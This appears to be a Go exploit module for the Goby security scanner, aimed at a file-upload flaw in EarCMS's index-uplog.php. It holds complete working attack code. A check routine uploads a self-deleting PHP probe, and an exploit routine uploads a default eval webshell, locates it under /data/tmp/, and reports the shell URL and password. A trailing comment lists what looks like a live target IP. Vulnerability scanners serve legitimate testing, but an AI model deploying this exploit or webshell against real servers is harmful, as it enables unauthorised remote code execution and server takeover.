package exploits

import (
	"bytes"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"mime/multipart"
	"net/textproto"
	"strings"
)

func init() {
	expJson := `{
    "Name": "EarCMS index-uplog.php File Upload GetShell",
    "Description": "Ear CMS is a content management system. There is a Code Execution Vulnerability in the ear distribution foreground. By constructing malicious code, the attacker can obtain the permission of the server.",
    "Product": "earcms",
    "Homepage": "https://gobies.org/",
    "DisclosureDate": "2021-06-09",
    "Author": "gobysec@gmail.com",
    "GobyQuery": "body=\"icon-comma\"",
    "Level": "3",
    "Impact": "<p>As a result, hackers can upload malicious files to the server to obtain the server permissions.</p>",
    "Recommendation": "<p>1. The execution permission is disabled in the storage directory of the uploaded file.</p><p>2. File suffix white list.</p><p>3. Upgrade to the latest version.</p>",
    "References": [
        "https://zhuanlan.zhihu.com/p/81934322"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "<?php @eval($_REQUEST[1]); if($_GET['act']=='del'){unlink(__FILE__);}?>"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": [
        "File Upload"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10214"
}`

	postinfo := func(shell, fieldname string, filename string, params map[string]string) (*bytes.Buffer, string) {
		bodyBuf := &bytes.Buffer{}
		bw := multipart.NewWriter(bodyBuf)
		h := make(textproto.MIMEHeader)
		h.Set("Content-Disposition", fmt.Sprintf(`form-data; name="%s"; filename="%s"`, fieldname, filename))
		h.Set("Content-Type", "image/jpg")
		bodyWriter, _ := bw.CreatePart(h)
		bodyWriter.Write([]byte(shell))
		if params != nil {
			for key, val := range params {
				_ = bw.WriteField(key, val)
			}
		}

		contentType := bw.FormDataContentType()
		bw.Close()

		return bodyBuf, contentType
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/source/pack/upload/index-uplog.php"
			shell := "<?php echo md5(233);unlink(__FILE__);?>"
			fieldname := "app"
			fname := goutils.RandomHexString(32)
			filename := fmt.Sprintf("%s.php", goutils.RandomHexString(32))
			extraParams := map[string]string{
				"time": fname,
			}
			pinfo, ctype := postinfo(shell, fieldname, filename, extraParams)
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", ctype)
			cfg.VerifyTls = false
			cfg.FollowRedirect = true
			cfg.Data = pinfo.String()
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "extension") {
					shell_url := fmt.Sprintf("%s/data/tmp/%s.php", u.FixedHostInfo, fname)
					if resp, err := httpclient.SimpleGet(shell_url); err == nil {
						return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "e165421110ba03099a1c0393373c5b43")
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/source/pack/upload/index-uplog.php"
			shell := fmt.Sprintf("%s", ss.Params["cmd"].(string))
			fieldname := "app"
			fname := goutils.RandomHexString(32)
			filename := fmt.Sprintf("%s.php", goutils.RandomHexString(32))
			extraParams := map[string]string{
				"time": fname,
			}
			pinfo, ctype := postinfo(shell, fieldname, filename, extraParams)
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", ctype)
			cfg.VerifyTls = false
			cfg.FollowRedirect = true
			cfg.Data = pinfo.String()
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "extension") {
					shell_url := fmt.Sprintf("%s/data/tmp/%s.php", expResult.HostInfo.FixedHostInfo, fname)
					if resp, err := httpclient.SimpleGet(shell_url); err == nil {
						if resp.StatusCode == 200 {
							expResult.Success = true
							shellinfo := fmt.Sprintf("webshell url: %s, pass:1", shell_url)
							expResult.Output = shellinfo
						}
					}
				}
			}

			return expResult
		},
	))
}

//http://47.95.116.63
